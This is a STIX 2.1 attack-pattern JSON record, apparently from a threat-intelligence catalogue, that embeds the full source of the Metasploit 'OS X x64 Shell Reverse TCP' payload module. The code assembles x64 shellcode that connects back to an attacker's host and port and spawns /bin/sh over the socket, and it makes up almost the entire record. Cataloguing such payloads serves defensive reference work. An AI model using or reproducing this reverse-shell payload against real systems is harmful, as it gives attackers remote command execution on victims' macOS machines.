{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f79d0171-7396-4e44-9c75-fb0cac5614c0",
    "created": "2024-08-14T16:33:19.358776Z",
    "modified": "2024-08-14T16:33:19.35878Z",
    "name": "OS X x64 Shell Reverse TCP",
    "description": "Connect back to attacker and spawn a command shell",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/osx/x64/shell_reverse_tcp.rb",
            "external_id": "shell_reverse_tcp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nmodule MetasploitModule\n\n  CachedSize = 128\n\n  include Msf::Payload::Single\n  include Msf::Payload::Osx\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(\n      merge_info(\n        info,\n        'Name' => 'OS X x64 Shell Reverse TCP',\n        'Description' => 'Connect back to attacker and spawn a command shell',\n        'Author' => 'nemo <nemo[at]felinemenace.org>',\n        'License' => MSF_LICENSE,\n        'Platform' => 'osx',\n        'Arch' => ARCH_X64,\n        'Handler' => Msf::Handler::ReverseTcp,\n        'Session' => Msf::Sessions::CommandShellUnix\n      )\n    )\n\n    # exec payload options\n    register_options(\n      [\n        OptString.new('CMD', [ true, 'The command string to execute', '/bin/sh' ]),\n        Opt::LHOST,\n        Opt::LPORT(4444)\n      ]\n    )\n  end\n\n  # build the shellcode payload dynamically based on the user-provided CMD\n  def generate(_opts = {})\n    lhost = datastore['LHOST'] || '127.0.0.1'\n    # OptAddress allows either an IP or hostname, we only want IPv4\n    unless Rex::Socket.is_ipv4?(lhost)\n      raise ArgumentError, 'LHOST must be in IPv4 format.'\n    end\n\n    cmd = (datastore['CMD'] || '') + \"\\x00\"\n    encoded_port = [datastore['LPORT'].to_i, 2].pack('vn').unpack1('N')\n    encoded_host = Rex::Socket.addr_aton(lhost).unpack1('V')\n    encoded_host_port = format('0x%.8x%.8x', encoded_host, encoded_port)\n\n    shell_asm = %(\n      mov eax,0x2000061\n      push 0x2\n      pop rdi\n      push 0x1\n      pop rsi\n      xor rdx,rdx\n      syscall\n      mov r12,rax\n      mov rdi,rax\n      mov eax,0x2000062\n      xor rsi,rsi\n      push rsi\n      mov rsi, #{encoded_host_port}\n      push rsi\n      mov rsi,rsp\n      push 0x10\n      pop rdx\n      syscall\n      mov rdi,r12\n      mov eax,0x200005a\n      mov rsi,2\n      syscall\n      mov eax,0x200005a\n      mov rsi,1\n      syscall\n      mov eax,0x200005a\n      mov rsi,0\n      syscall\n      xor rax,rax\n      mov eax,0x200003b\n      call load_cmd\n      db \"#{cmd}\", 0x00\n    load_cmd:\n      pop rdi\n      xor rdx,rdx\n      push rdx\n      push rdi\n      mov rsi,rsp\n      syscall\n    )\n\n    Metasm::Shellcode.assemble(Metasm::X64.new, shell_asm).encode_string\n  end\nend\n",
    "x_mitre_platforms": [
        "osx'"
    ]
}